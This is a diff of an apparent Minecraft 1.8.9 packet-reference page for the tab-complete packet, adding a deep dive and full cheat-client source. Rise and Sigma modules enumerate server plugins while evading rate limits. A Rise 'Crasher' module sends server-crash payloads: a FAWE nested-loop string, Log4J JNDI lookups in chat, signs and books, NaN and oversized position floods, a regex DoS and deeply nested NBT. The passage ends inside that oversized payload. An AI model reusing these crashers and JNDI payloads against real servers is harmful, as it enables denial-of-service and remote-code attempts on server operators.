@@ -18,14 +18,14 @@
 <meta name="twitter:description" content="C14PacketTabComplete (0x14): Player presses Tab in chat to request auto-completion. Sends the partial message or command.">
 <meta name="twitter:label1" content="Direction"><meta name="twitter:data1" content="Serverbound">
 <meta name="twitter:label2" content="State"><meta name="twitter:data2" content="PLAY">
-<meta name="twitter:label3" content="Modules"><meta name="twitter:data3" content="AntiTabComplete">
+<meta name="twitter:label3" content="Modules"><meta name="twitter:data3" content="Plugins, PluginFinder, Crasher (FAWE), Chat (custom tab complete)">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📦</text></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../../css/style.css">
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"TechArticle","headline":"C14PacketTabComplete — Minecraft 1.8.9 Packet Reference","description":"","about":{"@type":"SoftwareApplication","name":"Minecraft Java Edition","version":"1.8.9"},"proficiencyLevel":"Expert","articleSection":"PLAY Protocol — Serverbound"}
+{"@context":"https://schema.org","@type":"TechArticle","headline":"C14PacketTabComplete — Minecraft 1.8.9 Packet Reference","description":"The tab-complete request packet and the protocol's least-guarded information oracle. Plugin enumeration (Rise 5.99 Plugins, Sigma PluginFinder), a FAWE command-parser crash (Rise 5.99 Crasher) and custom chat completion (Rise 6.x Chat) are the corpus families.","about":{"@type":"SoftwareApplication","name":"Minecraft Java Edition","version":"1.8.9"},"proficiencyLevel":"Expert","articleSection":"PLAY Protocol — Serverbound"}
 </script>
 </head>
 <body>
@@ -73,13 +73,919 @@
 </div></div>
 <div class="detail-section"><h3>Handler Interface</h3><div class="mcp-block"><div class="mcp-row"><span class="mcp-label">HND</span><code>INetHandlerPlayServer</code></div></div></div>
 <div class="detail-section"><h3>Notes</h3><div class="notes-box">The server responds with S3APacketTabComplete containing matching commands/player names. The optional BlockPos allows for block-sensitive completions (e.g., filling /give with block IDs of looked-at block).</div></div>
+<div class="detail-section"><h3>Deep Dive</h3><div class="writeup-block">
+<h4>Role in the protocol</h4>
+<p>C14 requests command and player-name completions: a String (the partial input, with or without the leading slash) and an optional BlockPos for block-sensitive completions. The server replies with S3APacketTabComplete. GuiChat fires it on the tab key; the position is set when the cursor is over a block, which lets /give-style commands complete with looked-at block data.</p>
+<h4>Vanilla handling</h4>
+<p>processTabComplete calls the server command dispatcher's getTabCompletions with the message and target block, collects the returned strings and replies with S3A. There is no rate limit or throttle in the bundled 1.8.9 handler, which is what makes the packet a free information oracle: every registered command, including plugin-registered ones, is reachable through the completion namespace.</p>
+<h4>Why clients touch it</h4>
+<p>Three families across the 8 clients. (1) Plugin enumeration: Rise 5.99 Plugins sends '/' and parses S3A, with a Bypass mode that sweeps '/a'..'/z'; Sigma 4.11's PluginFinder command sends '/' once and parses the reply for ':' prefixed plugin names. (2) Crasher: Rise 5.99's FAWE mode sends a deeply nested command string. (3) Chat UX: the Rise 6.x Chat module drives its own completion via C14 with a block position.</p>
+<h4>Exploit surface</h4>
+<p>The missing throttle is the whole story: a client can dump the full command namespace by sweeping single letters, and servers that hide the plain '/' reply still leak commands through per-letter prefixes. The FAWE crash works because the completion handler parses the input command recursively; a 4-deep loop body of nested for() statements overflows that parser. Anti-cheats ignore C14; anti-exploit plugins rate-limit completions, which is exactly what Plugins' Bypass mode cycles around.</p>
+</div></div>
+<div class="detail-section"><h3>Server-Side Handling</h3><div class="callout callout-server"><p>processTabComplete: getTabCompletions(message, targetBlock) then S3APacketTabComplete with the results. No permission pre-check beyond what the dispatcher applies to the requesting player, no rate limit, no length cap beyond the String wire limit. Completions are computed against the live command registry, so plugin commands appear without any /plugins permission.</p></div></div>
+<div class="detail-section"><h3>Protocol Analysis</h3><div class="callout callout-proto"><p>VarInt-length-prefixed String + bool hasTargetBlock + optional BlockPos. The message does not need to start with '/' for the server to run the completion path. Replies are a String array; plugin-registered commands commonly appear as pluginname:command, which is the parsing key for enumeration tools.</p></div></div>
+<div class="detail-section"><h3>Anti-Cheat Landscape</h3><div class="callout callout-ac"><p>No anti-cheat measures C14. Anti-exploit and anti-spam plugins throttle completion requests per second; the '/a'..'/z' sweep is designed to stay under naive thresholds while still covering the namespace. The FAWE payload is a plugin-specific parser kill and is invisible to movement anti-cheats.</p></div></div>
 <div class="impl-section"><h3><span class="impl-badge">implementation</span> Implementation Cases</h3>
-<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">AntiTabComplete</span>
+<p class="impl-pattern">The tab-complete request packet and the protocol's least-guarded information oracle. Plugin enumeration (Rise 5.99 Plugins, Sigma PluginFinder), a FAWE command-parser crash (Rise 5.99 Crasher) and custom chat completion (Rise 6.x Chat) are the corpus families.</p>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Plugins</span>
+<span class="impl-module-clients">(Rise 5.99)</span>
 </div>
-<p class="impl-pattern">Cancel tab-complete requests to hide commands from server logs.</p>
-<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventSendPacket</span></div>
+<p class="impl-pattern">Enumerate the server's plugin list through the tab-complete namespace and print it in chat.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">Normal mode sends C14('/') once and parses the S3A reply for completions. Bypass mode sends C14('/' + letter) for every letter of the alphabet to recover commands that servers filter from the plain dump; results are cached and the module disables after the sweep.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 5.99 — dev/rise/module/impl/other/Plugins.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 5.99 — dev/rise/module/impl/other/Plugins.java =====
+/*
+ Copyright Alan Wood 2021
+ None of this code to be reused without my written permission
+ Intellectual Rights owned by Alan Wood
+ */
+package dev.rise.module.impl.other;
+
+import dev.rise.Rise;
+import dev.rise.event.impl.motion.PreMotionEvent;
+import dev.rise.event.impl.packet.PacketReceiveEvent;
+import dev.rise.module.Module;
+import dev.rise.module.api.ModuleInfo;
+import dev.rise.module.enums.Category;
+import dev.rise.setting.impl.ModeSetting;
+import dev.rise.util.math.TimeUtil;
+import dev.rise.util.player.PacketUtil;
+import net.minecraft.network.play.client.C14PacketTabComplete;
+import net.minecraft.network.play.server.S3APacketTabComplete;
+
+import java.util.ArrayList;
+
+@ModuleInfo(name = "Plugins", description = "Displays what plugins a server has in chat", category = Category.OTHER)
+public final class Plugins extends Module {
+
+    private final ModeSetting mode = new ModeSetting("Mode", this, "Normal", "Normal", "Bypass");
+
+    private final ArrayList&lt;String&gt; cachedPlugins = new ArrayList&lt;&gt;();
+    private final TimeUtil timer = new TimeUtil();
+
+    @Override
+    public void onPreMotion(final PreMotionEvent event) {
+        switch (mode.getMode()) {
+            case "Normal":
+                if (timer.hasReached(5000L)) {
+                    this.registerNotification("Failed to detect any plugins.");
+                    this.toggleModule();
+                }
+                break;
+
+            case "Bypass":
+                if (timer.hasReached(2500L))
+                    this.toggleModule();
+                break;
+        }
+    }
+
+    @Override
+    public void onPacketReceive(final PacketReceiveEvent event) {
+        if (event.getPacket() instanceof S3APacketTabComplete) {
+            switch (mode.getMode()) {
+                case "Normal":
+                    for (final String command : ((S3APacketTabComplete) event.getPacket()).func_149630_c()) {
+                        final String[] pluginCommand = command.split(":");
+                        if (pluginCommand.length &gt; 1 &amp;&amp; !pluginCommand[0].startsWith("/minecraft")) {
+                            final String plugin = pluginCommand[0].replaceAll("/", "");
+
+                            if (!cachedPlugins.contains("Plugins:")) {
+                                Rise.addChatMessage("Plugins:");
+                                cachedPlugins.add("Plugins:");
+                            }
+
+                            if (!cachedPlugins.contains(plugin)) {
+                                cachedPlugins.add(plugin);
+                                Rise.addChatMessage(plugin);
+                            }
+                        }
+                    }
+
+                    if (cachedPlugins.isEmpty())
+                        this.registerNotification("No plugins found.");
+
+                    this.toggleModule();
+                    break;
+
+                case "Bypass":
+                    for (final String command : ((S3APacketTabComplete) event.getPacket()).func_149630_c()) {
+                        final String[] pluginCommand = command.split(":");
+                        if (pluginCommand.length &gt; 1 &amp;&amp; !pluginCommand[0].startsWith("/minecraft")) {
+                            final String plugin = pluginCommand[0].replaceAll("/", "");
+
+                            if (!cachedPlugins.contains(plugin))
+                                cachedPlugins.add(plugin);
+                        }
+                    }
+                    break;
+            }
+        }
+    }
+
+    @Override
+    protected void onEnable() {
+        switch (mode.getMode()) {
+            case "Normal":
+                PacketUtil.sendPacket(new C14PacketTabComplete("/"));
+                break;
+
+            case "Bypass":
+                final String alphabet = "abcdefghijklmnopqrstuvwxyz";
+
+                for (int i = 0; i &lt; alphabet.length(); i++)
+                    PacketUtil.sendPacket(new C14PacketTabComplete("/" + alphabet.charAt(i)));
+                break;
+        }
+        cachedPlugins.clear();
+        timer.reset();
+    }
+
+    @Override
+    protected void onDisable() {
+        if (mode.is("Bypass") &amp;&amp; !cachedPlugins.isEmpty()) {
+            Rise.addChatMessage("Plugins:");
+
+            for (final String name : cachedPlugins)
+                Rise.addChatMessage(name);
+        }
+    }
+}
+// NOTE (AI): Plugins enumerates a server's plugin list via tab completion. Normal mode sends C14 with the string '/' and parses the S3APacketTabComplete reply. Bypass mode sends '/a' through '/z' one letter at a time; servers that strip command names from the plain '/' dump still leak them in the per-letter replies, because the completion logic filters by prefix instead of hiding the command set. The module caches results and disables itself after the sweep.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> onEnable (direct PacketUtil.sendPacket), S3APacketTabComplete via PacketReceiveEvent.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>The per-letter sweep is the anti-throttle trade-off: slow enough to dodge naive rate limits, complete enough to enumerate hidden commands.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Sigma 4.11 implements the same idea as a one-shot command rather than a module.</span></div>
 </div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">PluginFinder</span>
+<span class="impl-module-clients">(Sigma 4.11)</span>
 </div>
+<p class="impl-pattern">Discover plugins with a single '/'-completion and a 20 second listener window.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">The command sends C14('/'), registers an EventPacket listener, parses S3A completions for ':' prefixed names, prints the deduplicated plugin list and unregisters. A 20 second timer aborts the wait.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Sigma 4.11 — info/sigmaclient/management/command/impl/PluginFinder.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Sigma 4.11 — info/sigmaclient/management/command/impl/PluginFinder.java =====
+package info.sigmaclient.management.command.impl;
+
+import info.sigmaclient.event.Event;
+import info.sigmaclient.event.impl.EventPacket;
+import info.sigmaclient.util.Timer;
+import info.sigmaclient.event.EventSystem;
+import info.sigmaclient.event.RegisterEvent;
+import info.sigmaclient.management.command.Command;
+import info.sigmaclient.util.NetUtil;
+import info.sigmaclient.util.misc.ChatUtil;
+import net.minecraft.network.play.client.C14PacketTabComplete;
+import net.minecraft.network.play.server.S3APacketTabComplete;
+
+/**
+ * Created by Arithmo on 5/7/2017 at 3:12 PM.
+ */
+public class PluginFinder extends Command {
+
+    public PluginFinder(String[] names, String description) {
+        super(names, description);
+    }
+
+    private Timer timer = new Timer();
+
+    @Override
+    public void fire(String[] args) {
+        try {
+            timer.reset();
+            EventSystem.register(this);
+            NetUtil.sendPacket(new C14PacketTabComplete("/"));
+            ChatUtil.printChat(chatPrefix + "Listening for a S3APacketTabComplete for 20s!");
+        } catch (Exception ceankoFucksOff) {
+            ceankoFucksOff.printStackTrace();
+        }
+    }
+
+    @RegisterEvent(events = {EventPacket.class})
+    public void onEvent(Event event) {
+        try {
+            EventPacket ep = (EventPacket) event;
+            if (ep.getPacket() instanceof S3APacketTabComplete) {
+                S3APacketTabComplete packet = (S3APacketTabComplete) ep.getPacket();
+                String[] commands = packet.func_149630_c();
+                String message = "";
+                int size = 0;
+
+                for (String command : commands) {
+                    String pluginName = command.split(":")[0].substring(1);
+
+                    if (!message.contains(pluginName) &amp;&amp; command.contains(":") &amp;&amp; !pluginName.equalsIgnoreCase("minecraft") &amp;&amp; !pluginName.equalsIgnoreCase("bukkit")) {
+                        size++;
+                        if (message.isEmpty()) {
+                            message += pluginName;
+                        } else {
+                            message += "\2478, \247a" + pluginName;
+                        }
+                    }
+                }
+
+                if (!message.isEmpty()) {
+                    ChatUtil.printChat(chatPrefix + "\2477Plugins (\247f" + size + "\2477): \247a " + message + "\2477.");
+                } else {
+                    ChatUtil.printChat(chatPrefix + "Plugins: none.");
+                }
+                EventSystem.unregister(this);
+                event.setCancelled(true);
+            }
+
+            if (timer.delay(20000)) {
+                EventSystem.unregister(this);
+                ChatUtil.printChat(chatPrefix + "Stopped listening for an S3APacketTabComplete! Took to long (20s)!");
+            }
+        } catch (Exception ceankoFucksOff) {
+            ceankoFucksOff.printStackTrace();
+        }
+    }
+
+    @Override
+    public String getUsage() {
+        return "pluginfinder";
+    }
+
+}
+// NOTE (AI): PluginFinder is a chat command, not a module. fire() resets a 20 second timer, registers an event listener and sends one C14 with '/'. The listener watches EventPacket for S3APacketTabComplete, splits each completion on ':' and prints the plugin prefix, skipping minecraft and bukkit. It unregisters after the first reply or the 20 second timeout.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> EventPacket (register/unregister pattern), NetUtil.sendPacket.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>One packet per invocation makes it effectively undetectable by rate-based guards; it trades completeness for stealth compared to Rise's alphabet sweep.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Rise 5.99 Plugins covers the same ground as a module with a Bypass mode; no other client has a C14 plugin finder.</span></div>
+</div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Crasher (FAWE)</span>
+<span class="impl-module-clients">(Rise 5.99)</span>
+</div>
+<p class="impl-pattern">Crash FastAsyncWorldEdit by completing a pathologically nested command string.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">FAWE mode sends C14 with the nested '/to for(i=0;i<256;i++){...}' string every tick via sendPacketWithoutEvent.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 5.99 — dev/rise/module/impl/other/Crasher.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 5.99 — dev/rise/module/impl/other/Crasher.java =====
+/*
+ Copyright Alan Wood 2021
+ None of this code to be reused without my written permission
+ Intellectual Rights owned by Alan Wood
+ */
+package dev.rise.module.impl.other;
+
+import dev.rise.event.impl.motion.PreMotionEvent;
+import dev.rise.module.Module;
+import dev.rise.module.api.ModuleInfo;
+import dev.rise.module.enums.Category;
+import dev.rise.setting.impl.ModeSetting;
+import dev.rise.setting.impl.NumberSetting;
+import dev.rise.util.player.PacketUtil;
+import dev.rise.util.player.PlayerUtil;
+import io.netty.buffer.Unpooled;
+import net.minecraft.init.Blocks;
+import net.minecraft.init.Items;
+import net.minecraft.item.ItemStack;
+import net.minecraft.nbt.NBTTagCompound;
+import net.minecraft.nbt.NBTTagList;
+import net.minecraft.nbt.NBTTagString;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.*;
+import net.minecraft.util.BlockPos;
+import net.minecraft.util.ChatComponentText;
+import net.minecraft.util.EnumFacing;
+import net.minecraft.util.IChatComponent;
+import org.apache.commons.lang3.RandomStringUtils;
+import org.apache.commons.lang3.RandomUtils;
+
+@ModuleInfo(name = "Crasher", description = "Crashes some servers", category = Category.OTHER)
+public final class Crasher extends Module {
+
+    private final ModeSetting mode = new ModeSetting("Mode", this, "Pex", "Pex", "Multiverse", "FAWE", "Log4J", "Invalid Move", "Rotation", "Sign", "Book", "Chunk", "NaN", "Fly", "Click", "Block Click", "Window", "BEdit", "Mare", "Interact", "One Packet", "AAC5");
+    private final NumberSetting packets = new NumberSetting("Packets", this, 10, 1, 100, 1);
+
+    @Override
+    public void onUpdateAlwaysInGui() {
+        packets.hidden = !(mode.is("Mare") || mode.is("Interact"));
+    }
+
+    @Override
+    public void onPreMotion(final PreMotionEvent event) {
+        if (mc.isIntegratedServerRunning() || PlayerUtil.isOnServer("127.0.0.1") || PlayerUtil.isOnServer("localhost"))
+            return;
+
+        if (mc.thePlayer.ticksExisted &lt; 5) {
+            this.toggleModule();
+            this.registerNotification("Disabled " + this.getModuleInfo().name() + " due to world change.");
+            return;
+        }
+
+        switch (mode.getMode()) {
+            case "Pex": {
+                if (mc.thePlayer.ticksExisted % 20 == 0) {
+                    mc.thePlayer.sendChatMessage("/pex promote a a");
+                    mc.thePlayer.sendChatMessage("/pex promote b b");
+                }
+                break;
+            }
+
+            case "Multiverse": {
+                if (mc.thePlayer.ticksExisted % 20 == 0)
+                    mc.thePlayer.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
+                break;
+            }
+
+            case "FAWE": {
+                PacketUtil.sendPacketWithoutEvent(new C14PacketTabComplete("/to for(i=0;i&lt;256;i++){for(j=0;j&lt;256;j++){for(k=0;k&lt;256;k++){for(l=0;l&lt;256;l++){ln(pi)}}}}"));
+                break;
+            }
+
+            case "Log4J": {
+                mc.thePlayer.sendChatMessage("/ ${jndi:rmi://localhost:3000}");
+
+                this.toggleModule();
+                this.registerNotification("Attempted to crash the server.");
+                break;
+            }
+
+            case "Invalid Move": {
+                PacketUtil.sendPacket(new C03PacketPlayer.C06PacketPlayerPosLook(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, event.isGround()));
+                break;
+            }
+
+            case "Rotation": {
+                PacketUtil.sendPacket(new C03PacketPlayer.C05PacketPlayerLook(9.223372E18F, 9.223372E18F, event.isGround()));
+                break;
+            }
+
+            case "Sign": {
+                final IChatComponent[] text = new IChatComponent[]{new ChatComponentText("${jndi:rmi://localhost:3000}")};
+                PacketUtil.sendPacket(new C12PacketUpdateSign(BlockPos.ORIGIN, text));
+                break;
+            }
+
+            case "Book": {
+                final NBTTagCompound comp = new NBTTagCompound();
+                final NBTTagList list = new NBTTagList();
+
+                list.appendTag(new NBTTagString("${jndi:rmi://localhost:3000}"));
+
+                comp.setString("author", "${jndi:rmi://localhost:3000}");
+                comp.setString("title", "${jndi:rmi://localhost:3000}");
+                comp.setByte("resolved", (byte) 1);
+                comp.setTag("pages", list);
+                final ItemStack stack = new ItemStack(Items.writable_book);
+                stack.setTagCompound(comp);
+                final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
+                buffer.writeItemStackToBuffer(stack);
+                PacketUtil.sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
+                break;
+            }
+
+            case "Chunk": {
+                double x = mc.thePlayer.posX, y = mc.thePlayer.posY, z = mc.thePlayer.posZ;
+
+                for (int i = 0; i &lt; 32000; i++)
+                    PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(x++, y &gt;= 255 ? 255 : y++, z++, true));
+                break;
+            }
+
+            case "NaN": {
+                PacketUtil.sendPacket(new C03PacketPlayer.C06PacketPlayerPosLook(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, event.isGround()));
+                break;
+            }
+
+            case "Fly": {
+                double y = 0, z;
+                int i;
+
+                for (i = 0; i &lt; 200; i++) {
+                    y = i * 9;
+                    PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY + y, mc.thePlayer.posZ, false));
+                }
+
+                for (i = 0; i &lt; 10000; i++) {
+                    z = i * 9;
+                    PacketUtil.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY + y, mc.thePlayer.posZ + z, false));
+                }
+                break;
+            }
+
+            case "Block Click": {
+                PacketUtil.sendPacket(new C0EPacketClickWindow(0, 0, 0, 1, new ItemStack(Blocks.piston_head), (short) 0));
+                break;
+            }
+
+            case "Click": {
+                for (int c = 0; c &lt; 30; c++) {
+                    final NBTTagCompound comp = new NBTTagCompound();
+                    final NBTTagList list = new NBTTagList();
+
+                    for (int i = 0; i &lt; 2; i++) {
+                        list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{